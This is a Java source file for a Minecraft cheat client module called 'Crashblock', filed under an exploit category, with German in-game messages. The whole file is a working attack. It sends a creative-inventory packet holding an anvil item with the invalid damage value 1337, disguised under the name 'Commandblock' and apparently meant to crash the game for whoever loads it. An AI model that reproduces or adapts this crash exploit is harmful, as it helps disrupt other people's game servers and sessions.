package me.bratwurst.module.modules.Crasher;

import me.bratwurst.event.EventTarget;
import me.bratwurst.event.events.EventMotionUpdate;
import me.bratwurst.module.Category;
import me.bratwurst.module.Module;
import me.bratwurst.utils.player.PlayerUtils;
import net.minecraft.client.Minecraft;
import net.minecraft.init.Blocks;
import net.minecraft.item.Item;
import net.minecraft.item.ItemStack;
import net.minecraft.network.play.client.C10PacketCreativeInventoryAction;
import net.minecraft.util.EnumChatFormatting;

public class Crashblock extends Module {
    public Crashblock() {
        super("Crashblock", Category.EXPLOIT);
    }
    @EventTarget
    public void onUpdate(EventMotionUpdate e) {

    }

    @Override
    public void onEnable() {
        super.onEnable();
        if (!mc.thePlayer.capabilities.isCreativeMode) {
            PlayerUtils.sendMessage(EnumChatFormatting.AQUA + "Das funktioniert nur im Creativemode.");

        } else if (mc.thePlayer.inventory.getStackInSlot(0) != null) {
            PlayerUtils.sendMessage(EnumChatFormatting.AQUA + "Bitte halte denn ersten Slot frei.");

        } else {
            ItemStack stack = new ItemStack(Item.getItemFromBlock(Blocks.anvil));
            stack.setItemDamage(1337);
            stack.setStackDisplayName("Commandblock");
            mc.thePlayer.sendQueue.addToSendQueue(new C10PacketCreativeInventoryAction(36, stack));
            mc.thePlayer.closeScreen();
            PlayerUtils.sendMessage(EnumChatFormatting.AQUA +"Crashblock Block wurde erstellt.");
           toggle();
        }
    }
}
